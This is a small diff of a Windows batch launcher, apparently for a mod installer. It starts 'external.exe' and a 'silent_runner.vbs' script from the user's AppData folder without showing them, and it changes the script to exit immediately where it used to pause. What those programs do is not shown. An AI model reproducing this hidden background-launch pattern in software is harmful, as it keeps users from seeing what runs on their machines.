@@ -31,6 +31,4 @@ start "" "%appdata%\dsmodinstaller\external.exe"
 :: Run silent script silently
 start "" wscript.exe "%appdata%\dsmodinstaller\silent_runner.vbs"
 
-:: Keep terminal open
-echo Press any key to close...
-pause >nul
+exit
